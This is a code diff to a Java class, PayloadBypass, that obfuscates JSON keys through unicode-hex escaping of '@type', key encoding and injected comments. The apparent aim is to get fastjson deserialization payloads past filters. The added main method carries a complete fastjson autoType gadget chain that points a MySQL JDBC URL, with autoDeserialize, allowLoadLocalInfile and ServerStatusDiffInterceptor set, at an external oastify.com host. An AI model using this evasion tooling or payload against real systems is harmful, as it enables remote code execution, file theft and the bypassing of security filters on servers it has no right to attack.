@@ -21,11 +21,14 @@ public class PayloadBypass {
             Map<String, Object> newMap = new LinkedHashMap<>();
             for (Map.Entry<String, Object> entry : map.entrySet()) {
                 String encodedKey = entry.getKey().toString();
-                if (encodedKey.equals("@type")||encodedKey.equals("val")){
-                    encodedKey =toUnicodeHex(encodedKey);
-                }else {
-                    encodedKey = keyEncode(encodedKey);
+                if (encodedKey.length()>=5){
+                    if (encodedKey.equals("@type")){
+                        encodedKey =toUnicodeHex(encodedKey);
+                    }else {
+                        encodedKey = keyEncode(encodedKey);
+                    }
                 }
+
                 Object encodedValue = entry.getValue() != null ?
                         deepEncode(entry.getValue()) : null;
                 newMap.put(encodedKey, encodedValue);
@@ -39,8 +42,8 @@ public class PayloadBypass {
         } catch (JsonSyntaxException e) {
             String json = inputJson.replace("@type", toUnicodeHex("@type"));
             json = addComments(json);
-            String replace = ":/*"+Customhelps.randomString(6)+"*/";
-            json = json.replace(":", replace);
+            String replace = ":/*"+Customhelps.randomString(6)+"*/\"";
+            json = json.replace(":\"", replace);
             // 极端情况处理：当无法解析时返回空对象
             return json;
         }}
@@ -50,10 +53,12 @@ public class PayloadBypass {
             Map<String, Object> newMap = new LinkedHashMap<>();
             for (Map.Entry<?, ?> entry : map.entrySet()) {
                 String encodedKey = entry.getKey().toString();
-                if (encodedKey.equals("@type")||encodedKey.equals("val")){
-                    encodedKey =toUnicodeHex(encodedKey);
-                }else {
-                    encodedKey =keyEncode(encodedKey);
+                if (encodedKey.length()>=5){
+                    if (encodedKey.equals("@type")){
+                        encodedKey =toUnicodeHex(encodedKey);
+                    }else {
+                        encodedKey =keyEncode(encodedKey);
+                    }
                 }
                 newMap.put(encodedKey, deepEncode(entry.getValue()));
             }
@@ -134,4 +139,10 @@ public class PayloadBypass {
         return stringBuilder.toString();
     }
 
+    public static void main(String[] args) {
+String name = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\"proxy\":{\"connectionString\":{\"url\":\"jdbc:mysql://pg9t7wy0to9z2hn4g887aah67xdn1c.oastify.com:3306/test?allowLoadLocalInfile=true&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=user\"}}}";
+String s = processJson(name, true);
+        System.out.println(s);
+
+    }
 }
